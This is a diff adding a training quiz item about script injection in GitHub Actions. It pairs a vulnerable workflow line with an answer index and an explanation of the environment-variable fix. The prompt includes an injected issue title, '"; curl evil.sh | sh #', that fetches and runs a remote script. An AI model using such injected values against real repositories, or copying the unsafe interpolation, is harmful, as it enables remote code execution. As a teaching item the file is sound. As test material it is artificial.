@@ -1,0 +1,23 @@
+{
+  "id": "gh200-d5-q18",
+  "domainId": "gh200-d5",
+  "moduleId": "d5-script-injection",
+  "prompt": "A malicious issue title of `\"; curl evil.sh | sh #` should not be able to hijack this step — but as written it can. Click the vulnerable line.",
+  "explanation": "Interpolating `github.event.*` straight into `run:` splices attacker text into the shell script itself. The safe shape passes it through an environment variable — `env: TITLE: ${{ github.event.issue.title }}` then `echo \"Title: $TITLE\"` — so the shell reads a value instead of executing prose.",
+  "docIds": [
+    "secure-use"
+  ],
+  "kind": "bug",
+  "codeLines": [
+    "name: Triage bot",
+    "on:",
+    "  issues:",
+    "    types: [opened]",
+    "jobs:",
+    "  comment:",
+    "    runs-on: ubuntu-latest",
+    "    steps:",
+    "      - run: echo \"Title: ${{ github.event.issue.title }}\""
+  ],
+  "buggyLineIndex": 8
+}
